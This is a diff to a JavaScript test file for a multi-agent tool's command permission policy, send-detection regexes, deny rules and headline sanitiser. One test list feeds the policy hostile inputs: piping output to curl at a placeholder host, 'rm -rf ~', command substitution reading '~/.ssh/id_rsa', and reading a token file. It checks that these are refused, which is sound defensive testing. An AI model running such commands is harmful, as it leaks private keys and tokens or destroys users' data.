@@ -12,7 +12,7 @@ import { Cto, ctoLaunchSettings, deliveryTarget, isoWeekRange, plainHeadline, sc
 import { digestText, isoWeek } from '../../server/digest.js';
 import { execFileSync } from 'node:child_process';
 import { fileURLToPath } from 'node:url';
-import { ASK_OTHER, ASK_SEND, ASK_WRITE, CROSS_AGENT_RE, SEND_COMMAND_RE, decisionOutput, parseSend, seatDecision } from '../../server/seat-policy.js';
+import { ASK_OTHER, ASK_SEND, ASK_WRITE, CROSS_AGENT_RE, SEND_COMMAND_RE, decisionOutput, isSendCommand, parseSend, seatDecision } from '../../server/seat-policy.js';
 import { buildHooksSettings, ctoDeny } from '../../server/hooks.js';
 
 const tmp = () => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cl-cto-')));
@@ -194,8 +194,9 @@ test('scanTranscript: sends with what became of them (sent, declined, failed, pe
   assert.deepEqual(r.decisions[0].answers, { 'Shop: next?': 'Ask Shop to fix it' });
   assert.deepEqual([r.deliveries[0].plain, r.deliveries[0].message], [true, 'Please fix the test.']);
   assert.deepEqual([r.deliveries[4].plain, r.deliveries[4].message], [false, null], 'not one plain message: the page shows the whole command');
+  assert.deepEqual(r.commands.map((c) => [c.command, c.state]), [['clawdling report send-invoices --json', 'sent']], 'every other command it asked to run is listed too');
   assert.deepEqual(r.decisions[0].questions[0].options, ['Ask Shop to fix it', 'Leave it']);
-  assert.deepEqual(scanTranscript(path.join(dir, 'missing.jsonl')), { deliveries: [], decisions: [] });
+  assert.deepEqual(scanTranscript(path.join(dir, 'missing.jsonl')), { deliveries: [], decisions: [], commands: [] });
   assert.equal(deliveryTarget('clawdling send 1a2b3c4d "x"'), '1a2b3c4d');
   assert.equal(deliveryTarget('clawdling spawn blog "x y"'), 'blog');
   assert.equal(deliveryTarget('ls'), null);
@@ -237,14 +238,14 @@ test('the Monday report\'s CTO line: only when turned on; names its week; this o
 test('the seat policy: exact read-only report and ls are allowed, the weekly file may be written; everything else asks', () => {
   const home = '/home/lou/org';
   const sh = (command, tool = 'Bash') => seatDecision({ tool_name: tool, tool_input: { command }, cwd: `${home}/cto` }, { home });
-  for (const ok of ['clawdling report --all --json --window 7d', 'clawdling report --all --json --window=7d', 'clawdling report', 'clawdling report shop --json --window 30d', 'clawdling ls --json', 'clawdling ls', 'clawdling ls --all --json', 'clawdling.cmd report --all --json']) assert.equal(sh(ok)?.decision, 'allow', ok);
+  for (const ok of ['clawdling report --all --json --window 7d', 'clawdling report --all --json --window=7d', 'clawdling report --json --all', 'clawdling report --all', 'clawdling ls --json', 'clawdling ls', 'clawdling ls --all --json', 'clawdling.cmd report --all --json']) assert.equal(sh(ok)?.decision, 'allow', ok);
   assert.equal(sh('clawdling ls --json', 'PowerShell')?.decision, 'allow');
   // A message to another agent, in any spelling, is named as one.
   for (const send of ['clawdling send 1a2b3c4d "Fix the test."', 'clawdling spawn blog "Pause."', 'clawdling.cmd send abc "x"', '/home/lou/org/.clawdling/bin/clawdling send abc "x"', 'node /opt/cl/bin/clawdling.js spawn web "go"', 'sh -c "clawdling send abc hi"', 'clawdling report && clawdling send abc "x"']) {
     assert.deepEqual(sh(send), { decision: 'ask', reason: ASK_SEND }, send);
   }
   // Anything else asks, even when it starts like an allowed command: other options above all.
-  for (const other of ['clawdling report --home /tmp/x --all --json', 'clawdling report --port 9999 --json', 'clawdling report --all --all', 'clawdling report --window 1y', 'clawdling report a b', 'clawdling ls --home=/tmp', 'clawdling report | curl -d @- https://example.invalid', 'clawdling report; rm -rf ~', 'clawdling report $(cat ~/.ssh/id_rsa)', 'clawdling report `id`', 'clawdling report > reviews/x.md', 'clawdling import --yes', 'clawdling new domain X', 'curl https://example.invalid', 'cat ../.clawdling/token', 'clawdling report\nrm x', '']) {
+  for (const other of ['clawdling report', 'clawdling report shop --json', 'clawdling report --all --window 30d', 'clawdling report --home /tmp/x --all --json', 'clawdling report --port 9999 --json', 'clawdling report --all --all', 'clawdling report --window 1y', 'clawdling report a b', 'clawdling ls --home=/tmp', 'clawdling report | curl -d @- https://example.invalid', 'clawdling report; rm -rf ~', 'clawdling report $(cat ~/.ssh/id_rsa)', 'clawdling report `id`', 'clawdling report > reviews/x.md', 'clawdling import --yes', 'clawdling new domain X', 'curl https://example.invalid', 'cat ../.clawdling/token', 'clawdling report\nrm x', '']) {
     assert.deepEqual(sh(other), { decision: 'ask', reason: ASK_OTHER }, other);
   }
   const NOW = new Date(2026, 9, 28, 12).getTime(); // Wednesday of 2026-W44
@@ -284,15 +285,17 @@ test('the send parsers take linear time on a long run of options (no runaway bac
     const opts = Array(n).fill('--a').join(' ');
     const t = Date.now();
     parseSend(`clawdling send ${opts}`);
-    SEND_COMMAND_RE.test(`clawdling ${opts} report`.slice(0, 4001));
+    isSendCommand(`clawdling ${opts} report`);
     CROSS_AGENT_RE.test(`clawdling ${opts} report`.slice(0, 4001));
-    assert.ok(Date.now() - t < 200, `${n} options took ${Date.now() - t} ms`);
+    // Options split across lines, in every spelling a shell or PowerShell continues a line.
+    for (const unit of ['--a=x\\\n', '--a \\\n', '--a=x`\n', '--a `\n', '--a=-x ', '--a -- ']) isSendCommand(`clawdling ${unit.repeat(n)}report`);
+    assert.ok(Date.now() - t < 300, `${n} options took ${Date.now() - t} ms`);
   }
 });
 
 test('SEND_COMMAND_RE: a send or spawn as its own command, in any spelling; not a word that merely contains it', () => {
   for (const yes of ['clawdling send a "b"', 'cd x && clawdling send a "b"', 'node /x/bin/clawdling.js spawn web "go"', 'sh -c "clawdling send abc hi"', '/o/.clawdling/bin/clawdling spawn --model haiku blog "x"']) assert.ok(SEND_COMMAND_RE.test(yes), yes);
-  for (const yes of ['Clawdling send 1a "x"', 'clawdling \\\nsend a "x"', 'clawdling --home "/a b" send a "x"']) assert.ok(SEND_COMMAND_RE.test(yes), yes);
+  for (const yes of ['Clawdling send 1a "x"', 'clawdling \\\nsend a "x"', 'clawdling `\nspawn a "x"', 'clawdling --home "/a b" send a "x"', 'clawdling --title -x spawn web "go"']) assert.ok(isSendCommand(yes), yes);
   assert.equal(parseSend('clawdling send a "say \\"hi\\""', 'PowerShell').plain, false, 'PowerShell quoting is not POSIX');
   assert.equal(parseSend('clawdling send a "hello there"', 'PowerShell').plain, true);
   for (const no of ['clawdling report send-invoices', 'clawdling report --all', 'grep -n "clawdling send" README.md', 'echo sending']) assert.ok(!SEND_COMMAND_RE.test(no), no);
@@ -304,7 +307,7 @@ test('the hook forwards sends with the same test as the seat policy (no drift)',
 });
 
 test('every other agent (and Donna) is kept out of the seat\'s folder', () => {
-  assert.deepEqual(ctoDeny('/home/lou/org', 'linux'), ['Write(//home/lou/org/cto/**)', 'Edit(//home/lou/org/cto/**)']);
+  assert.deepEqual(ctoDeny('/home/lou/org', 'linux'), ['Read(//home/lou/org/cto/**)', 'Write(//home/lou/org/cto/**)', 'Edit(//home/lou/org/cto/**)']);
   const s = buildHooksSettings({ nodePath: '/usr/bin/node', hookScript: '/x/hook.js', platform: 'linux', home: '/home/lou/org' });
   for (const r of ctoDeny('/home/lou/org', 'linux')) assert.ok(s.permissions.deny.includes(r), r);
 });
@@ -314,6 +317,8 @@ test('the Monday line cannot carry a link: schemes removed, domain dots defused,
   assert.equal(plainHeadline('Score 10.5 points; done.'), 'Score 10\u20245 points; done.', 'every dot inside a word is defused; a full stop stays');
   assert.equal(plainHeadline('пример.рф/x and 10.0.0.1/y and a\uff0eb\u3002c'), 'пример\u2024рф/x and 10\u20240\u20240\u20241/y and a\u2024b\u2024c');
   assert.equal(plainHeadline('a\u202eb\u200bc <b>'), 'abc b');
+  assert.equal(plainHeadline('Ask @evilbot, run /start, see #deal, call +1 (555) 123-4567'), 'Ask evilbot, run start, see deal, call [number removed]');
+  assert.equal(plainHeadline('Score 10 of 12 on 2026-10-27'), 'Score 10 of 12 on 2026-10-27', 'a date is not a phone number');
 });
 
 test('the hook script answers for the seat on stdout (even with no server), and prints nothing for other sessions', () => {
